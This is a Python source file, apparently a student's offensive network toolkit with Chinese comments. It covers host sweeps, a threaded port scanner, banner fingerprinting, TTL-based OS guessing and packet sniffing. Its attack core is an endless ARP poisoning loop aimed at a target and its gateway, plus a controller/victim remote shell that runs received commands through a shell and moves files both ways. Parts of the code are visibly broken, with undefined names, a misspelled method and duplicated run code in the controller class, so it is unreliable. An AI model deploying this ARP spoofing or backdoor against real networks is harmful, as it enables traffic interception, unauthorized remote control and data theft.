from random import randint

import numpy

from include.ARP import ARP as ar_
from scapy.all import *
import threading
import nmap
import queue
import re
# 根据icmp 获取存活主机ip
def icmp_():
    # 判断目标主机是否存活
    def Scan(ip):
        ip_id = randint(1, 65535)
        icmp_id = randint(1, 65535)
        icmp_seq = randint(1, 65535)
        packet = IP(dst=ip, ttl=64, id=ip_id) / ICMP(id=icmp_id, seq=icmp_seq) / b"rootkit"
        result = sr1(packet, timeout=1, verbose=False)

        if result:
            for rcv in result:
                print(rcv[IP])
                scan_ip = rcv[IP].src
                print(scan_ip + "--->""Host is up")
        else:
            print(ip + "--->""Host is down")

    for i in range(1, 255):
        Scan("192.168.142." + str(i))

# 根据tcp 获取存活主机ip
def tcp_():
    def Scan(ip):
        try:
            dport=randint(1,65535)
            packet=IP(dst=ip)/TCP(flags="A",dport=dport)
            response=sr1(packet,timeout=1.0,verbose=0)
            if response:
                if int(response[TCP].flags)==4:
                    time.sleep(0.5)
                    print(ip+" "+"is up")
                else:
                    print(ip+" "+"is down")
            else:
                print(ip+" "+"is down")
        except:
            pass
    for i in range(1, 255):
        Scan("192.168.142." + str(i))
    pass

# 根据udp 获取存活主机ip
def udp_():
    def Scan(ip):
        try:
            dport = randint(1, 65535)
            packet = IP(dst=ip) / UDP(dport=dport)
            response = sr1(packet, timeout=1.0, verbose=0)
            if response:
                if int(response[IP].proto) == 1:
                    time.sleep(0.5)
                    print(ip + " " + "is up")
                else:
                    print(ip + " " + "is down")
            else:
                print(ip + " " + "is down")
        except:
            pass

# 根据arp 获取存活主机ip
def arp_():
    mac='0'
    ip='0'
    ipSplit=ip.split(".")
    ipList=[]
    for i in range(1,255):
        ipItem=".".join(ipSplit[:3])+'.'+str(i)
        ipList.append(ipItem)
    result=srp(Ether(src=mac,dst="FF:FF:FF:FF:FF:FF")/ARP(op=1,hwsrc=mac,hwdst="00:00:00:00:00:00",pdst=ipList),iface=iface
            ,timeout=2,verbose=False)
    resultAns=result[0].res
    liveHost=[]
    for i in range(len(resultAns)):
        ip_=resultAns[i][1][1].fields['psrc']
        mac_=resultAns[i][1][1].fields['hwsrc']
        liveHost.append([ip_,mac_])

# 端口扫描类，多线程
class PortScaner(threading.Thread):
    def __init__(self,portqueue,ip,timeout=3):
        threading.Thread.__init__(self)
        self._portqueue=portqueue
        self._ip=ip
        self._timeout=timeout

    def run(self):
        while True:
            if self._portqueue.empty():
                break
            port=self._portqueue.get(timeout=0.5)
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(self._timeout)
                result_code=s.connect_ex((self._ip,port))
                # 端口开放会返回0
                if result_code==0:
                    print("端口开放：%d"%port)

            except Exception as e:
                print(e)
            finally:
                s.close()

# 端口扫描
def portScan(targetip,port,threadNum):
    portList=[]
    portNumb=port
    if '-' in port:
        for i in range(int(port.split('-')[0]),int(port.split('-')[1])):
            portList.append(i)
    else:
        portList.append(int(port))
    threads=[]
    portQueue=queue.Queue()
    for port in portList:
        portQueue.put(port)
    for t in range(threadNum):
        threads.append(PortScaner(portQueue,targetip))
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()


SIGNS = (
    # 协议 | 版本 | 关键字
    b'FTP|FTP|^220.*FTP',
    b'MySQL|MySQL|mysql_native_password',
    b'oracle-https|^220- ora',
    b'Telnet|Telnet|Telnet',
    b'Telnet|Telnet|^\r\n%connection closed by remote host!\x00$',
    b'VNC|VNC|^RFB',
    b'IMAP|IMAP|^\* OK.*?IMAP',
    b'POP|POP|^\+OK.*?',
    b'SMTP|SMTP|^220.*?SMTP',
    b'Kangle|Kangle|HTTP.*kangle',
    b'SMTP|SMTP|^554 SMTP',
    b'SSH|SSH|^SSH-',
    b'HTTPS|HTTPS|Location: https',
    b'HTTP|HTTP|HTTP/1.1',
    b'HTTP|HTTP|HTTP/1.0',
)
def regex(response,port):
    text=""
    if re.search(b'<title>502 Bad Gateway',response):
        proto={"Service failed to access!!"}
    for pattern in SIGNS:
        pattern=pattern.split(b'|')
        if re.search(pattern[-1],response,re.IGNORECASE):
            proto="["+port+"]"+" open"+pattern[1].decode()
            break
        else:
            proto="["+port+"]"+" open Unrecognized"
    print(proto)

# 服务识别
def request(ip,port):
    response=""
    PROBE="GET / HTTP/1.0\r\n\r\n"
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.settimeout(10)
    result=sock.connect_ex((ip,int(port)))
    if result==0:
        print("start")
        try:
            sock.sendall(PROBE.encode())
            response=sock.recv(256)
            print(response)
            if response:
                regex(response,port)
        except(ConnectionResetError,socket.timeout) as e:
            print(e)
            pass
    else:
        print('end')
        pass
    sock.close()


# 端口开放：135
# 端口开放：139
# 端口开放：445
# 端口开放：1979
# 端口开放：1990
# 端口开放：3389
# 端口开放：6059
# 端口开放：8080
# 端口开放：27017

# 系统识别
def ttl_span(ip):
    ttlstrmatch=re.compile(r'ttl=\d+',re.I)
    ttsnummatch=re.compile(r'\d+')
    result=os.popen("ping "+ip)
    res=result.read()
    print(res)
    for line in res.splitlines():
        result=ttlstrmatch.findall(line)
        if result:
            print(result)
            ttl=ttsnummatch.findall(result[0])
            if int(ttl[0])<=64:
                print("%s  is Linux/Unix"%ip)
            else:
                print("%s  is windows"%ip)
            break
        else:
            pass

class sniffSan:

    def TimeStamp2Time(self,timeStamp):
        timeTmp=time.localtime(timeStamp)
        myTime=time.strftime("%Y-%m-%d %H:%M:%S",timeTmp)
        return myTime

    def PackCallBack(self,packet):
        print("*"*30)
        print("[%s]Source:%s:%s--->Target:%s:%s"%(self.TimeStamp2Time(packet.time),packet[IP].src,
                                                  packet.sport,packet[IP].dst,packet.dport))
        print(packet.show())
        print("*"*30)

    def run(self):
        defFilter="dst 112.80.248.76"
        packetCount=100
        filename="packets.pcap"
        packets=sniff(filter=defFilter,prn=self.PackCallBack,count=packetCount)
        wrpcap(filename,packets)

class arp_put:
    def __init__(self):
        self.iface=ifaces.dev_from_index(11)
        self.ip=self.iface.ip
        self.liveHost={}
        self.mac=self.iface.mac
        self.GetAllMAC()
        pass

    def get_mac_address(self):
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:].upper()
    # return '%s:%s:%s:%s:%s:%s' % (mac[0:2],mac[2:4],mac[4:6],mac[6:8],mac[8:10],mac[10:])
        return ":".join([mac[e:e + 2] for e in range(0, 11, 2)])

    def GetAllMAC(self):
        scanList=self.ip+"/24"
        try:
            # 对没个ip都进行ARP广播，获取存活主机的Mac
            ans,unans=srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=scanList),timeout=3)
            # ans包含存活主机返回的响应包和响应内容
            for send,rcv in ans:
                # 对响应内容的IP地址和MAC地址进行格式化输出，存入addrlist
                addrList=rcv.sprintf("%Ether.src%|%ARP.psrc%")
                self.liveHost[addrList.split("|")[1]]=addrList.split("|")[0]
        except Exception as e:
            print(e)

    def GetOneMAC(self,targetIP):
        if targetIP in self.liveHost.keys():
            return self.liveHost[targetIP]
        else:
            return 0

    # arp毒化函数，分别写入目标主机IP地址、网关IP地址、网卡接口名
    def poison(self,targetIP,gatewayIP,iframe):
        targetMAC=self.GetOneMAC(targetIP)
        gatewayMAC="78:1D:BA:3D:CC:95"
        if targetMAC and gatewayMAC:
            while True:
                # 对目标主机进行毒化
                sendp(Ether(src=self.mac,dst=targetMAC)/ARP(hwsrc=self.mac,hwdst=targetMAC,psrc=gatewayIP,pdst=targetIP
                                                            ,op=2),iface=iframe,verbose=False)
                # 对网关进行毒化
                sendp(Ether(src=self.mac, dst=gatewayMAC) / ARP(hwsrc=self.mac, hwdst=gatewayMAC, psrc=targetIP,
                                                               pdst=gatewayIP, op=2), iface=iframe, verbose=False)
                print(22)
                time.sleep(1)
        else:
            print("目标主机/网关主机IP有误，请检查！")
            sys.exit(0)


import subprocess
# 被控端
class underControl:
    def __init__(self):
        clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clientSocket.connect(("127.0.0.1", 6666))
        self.clientSocket=clientSocket
        self.run()
        pass

    # 命令执行函数
    def Execommand(self):
        while True:
            try:
                command=self.clientSocket.recv(1024).decode()
                commList=command.split()
                if commList[0]=='exit':
                    break
            #     执行cd时不能直接通过subprocess进行目录切换，否则会出现【Error 2】no such file or directory错误
                elif commList[0]=='cd':
                    os.chdir(commList[1])
            #         切换完毕后将当前被控端的工作路径发给主控端
                    self.clientSocket.sendall(os.getcwd().encode())
                else:
                    # 把执行结果也同时发送主控端
                    self.clientSocket.sendall(subprocess.check_output(command,shell=True))
            except Exception as message:
                self.clientSocket.sendall(("Failed to execute,please check your command for %s"%message).encode())
                continue

    def UploadFile(self,filepath):
        while True:
            uploadFilePath=filepath
            if os.path.isfile(uploadFilePath):
                pass
    #         先传输文件信息，防止粘包
    #             定义文件信息，128s表示文件名长度为128字节，l表示用int类型表示文件大小
    #             把文件名和文件大小信息进行打包封装，发送接收端
                fileInfo=struct.pack("128sl",bytes(os.path.basename(uploadFilePath).encode('utf-8')),os.stat(uploadFilePath).st_size)
                self.clientSocket.sendall(fileInfo)
                print("[+]FileInfo send success! name:{0}  size:{1}".format(os.path.basename(uploadFilePath),os.stat(uploadFilePath).st_size))
                print("[+]start uploading ....")
                with open(uploadFilePath,'rb') as f:
                    while True:
                        # 分块多次读，防止文件过大一次性读完导致内存不足
                        data=f.read(1024)
                        if not data:
                            print("[+]File ipload Over!!!")
                            break
                        self.clientSocket.sendall(data)
                    break

    def DownloadFile(self):
        while True:
            fileInfo=self.clientSocket.recv(struct.calcsize('128sl'))
            if fileInfo:
                fileName,fileSize=struct.unpack('128sl',fileInfo)
                # 把文件后面的多余空字符去除
                fileName=fileName.decode().strip('\00')
                newFilename=os.path.join('./',fileInfo)
                print('[+]FileInfo Receive over!  name:{0}  size:{1}'.format(fileName,fileSize))
                # 已接收问文件大小
                recvdSize=0
                print('[+]start receiving...')
                with open(newFilename,'wb') as f:
                    while not recvdSize==fileSize:
                        if fileSize-recvdSize>1024:
                            data=self.clientSocket.recv(1024)
                            f.write(data)
                            recvdSize+=len(data)
                        else:
                            data=self.clientSocket.recv(fileSize-recvdSize)
                            f.write(data)
                            recvdSize=fileSize
                            break
                    print('[+]File Receive over!!!')
                break

    # 文件传输函数
    def TransferFileds(self):
        while True:
            command = self.clientSocket.recv(1024).decode()
            commList = command.split()
            if commList[0]=='exit':
                break
        #     执行cd时不能直接通过subprocess进行目录切换，否则会出现【Error 2】no such file or directory错误
            elif commList[0]=='download':
                self.UploadFile(commList[1])
            elif commList[0] == 'upload':
                self.DownloadFile()

    def run(self):
        # 连接主控端

#         发送主控端主机名
        hostName=subprocess.check_output("hostname")
        self.clientSocket.sendall(hostName)

#         等待主控端指令
        print("[*]Waiting instruction...")
        while True:
            instruction=self.clientSocket.recv(10).decode()
            if instruction =='1':
                self.Execommand()
            elif instruction =='2':
                self.TransferFiles()
            elif instruction == 'exit':
                break
            else:
                pass

# 主控端
class Control:
    def __init__(self):
        serviceSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serviceSocket.bind(("127.0.0.1", 6666))
        serviceSocket.listen(1)
        self.serviceSocket=serviceSocket
        pass

    # 命令执行函数
    def Execommand(self,conn,addr):
        while True:
            command=input("[ExecCommand]>>>")
            if command=='exit':
                conn.sendall('exit'.encode())
                break
            conn.sendall(command.encode())
            result=conn.recv(10000).decode()
            print(result)


    def UploadFile(self,conn,addr,command):
        conn.sendall(command.encode())
        commandList=command.split()
        while True:
            uploadFilePath=commandList[1]
            if os.path.isfile(uploadFilePath):
                pass
    #         先传输文件信息，防止粘包
    #             定义文件信息，128s表示文件名长度为128字节，l表示用int类型表示文件大小
    #             把文件名和文件大小信息进行打包封装，发送接收端
                fileInfo=struct.pack("128sl",bytes(os.path.basename(uploadFilePath).encode('utf-8')),os.stat(uploadFilePath).st_size)
                conn.sendall(fileInfo)
                print("[+]FileInfo send success! name:{0}  size:{1}".format(os.path.basename(uploadFilePath),os.stat(uploadFilePath).st_size))
                print("[+]start uploading ....")
                with open(uploadFilePath,'rb') as f:
                    while True:
                        # 分块多次读，防止文件过大一次性读完导致内存不足
                        data=f.read(1024)
                        if not data:
                            print("[+]File Send Over!!!")
                            break
                        conn.sendall(data)
                    break

    def DownloadFile(self,conn,addr,command):
        conn.sendall(command.encode())
        while True:
            fileInfo=conn.recv(struct.calcsize('128sl'))
            if fileInfo:
                fileName,fileSize=struct.unpack('128sl',fileInfo)
                # 把文件后面的多余空字符去除
                fileName=fileName.decode().strip('\00')
                newFilename=os.path.join('./',fileInfo)
                print('[+]FileInfo Receive over!  name:{0}  size:{1}'.format(fileName,fileSize))
                # 已接收问文件大小
                recvdSize=0
                print('[+]start receiving...')
                with open(newFilename,'wb') as f:
                    while not recvdSize==fileSize:
                        if fileSize-recvdSize>1024:
                            data=conn.recv(1024)
                            f.write(data)
                            recvdSize+=len(data)
                        else:
                            data=conn.recv(fileSize-recvdSize)
                            f.write(data)
                            recvdSize=fileSize
                            break
                    print('[+]File Receive over!!!')
                break

    # 文件传输函数
    def TransferFileds(self,conn,addr):
        print('Usage: method filepath')
        print("Example: upload D://file | download  D://file")
        while True:
            command = input("[TransferFiles]>>> ")

            commList = command.split()
            if commList[0]=='exit':
                conn.sendall('exit'.encode())
                break
        #     执行cd时不能直接通过subprocess进行目录切换，否则会出现【Error 2】no such file or directory错误
            elif commList[0]=='download':
                self.DownloadFile(conn,addr,command)
            elif commList[0]=='upload':
                self.UploadFile(conn,addr,command)

    def run(self):

        conn,addr=self.serviceSocket.accept()
        hostName=conn.recv(1024)
        print("[+]Host is up!")
        print("="*30)
        print("name:{0}  ip:{1}  port:{2}".format(bytes.decode(hostName),addr[0],addr[1]))
        try:
            while True:
                print("Function selection")
                print("[1]ExecCommand  \n[2]TransferFiles")
                select=input('[None]>>>')
                if select=='1':
                    conn.sendall('1'.encode())
                    self.Execommand(conn,addr)
                elif select=='2':
                    conn.sendall('2'.encode())
                    self.TransferFileds(conn,addr)
                elif select=='exit':
                    conn.sendall('exit'.encode())
                    self.serviceSocket.close()
                    break
                pass
        except:
            self.serviceSocket.close()
            pass
        # 连接主控端

#         发送主控端主机名
        hostName=subprocess.check_output("hostname")
        self.clientSocket.sendall(hostName)

#         等待主控端指令
        print("[*]Waiting instruction...")
        while True:
            instruction=self.clientSocket.recv(10).decode()
            if instruction =='1':
                self.Execommand()
            elif instruction =='1':
                self.TransferFiles()
            elif instruction == '1':
                break
            else:
                pass


if __name__ == '__main__':
    #
    # s=arp_()
    # print(s.mac)
    # print(s.liveHost)
    # s.poison("192.168.142.1","192.168.142.200",s.iface.name)
    # ar=arp_put()
    # ar.poison("192.168.142.1","192.168.142.200",ar.iface)
    c=['fd']
    c.extend(['ds', 'dsd'])
    print(numpy.array(['']*3))
    # request("192.168.142.1",'27017')
    # portScan('192.168.142.1','1-65535',1000)
    # nm=nmap.PortScanner()
    # result=nm.scan(hosts="192.168.142.1",arguments='-sn -PE')
    # ip_packet=IP(dst="github.com")/ICMP()
    # pl=Ether(dst="ff:ff:ff:ff:ff:ff",src="30:9C:23:30:7A:2E")/ARP(pdst="192.168.142.1",psrc="192.168.142.255")
    # for i in range(300):
    #     sendp(pl)
    #     time.sleep(0.1)
    # print(ip_packet)
    pass


# ICMP探测主机存活
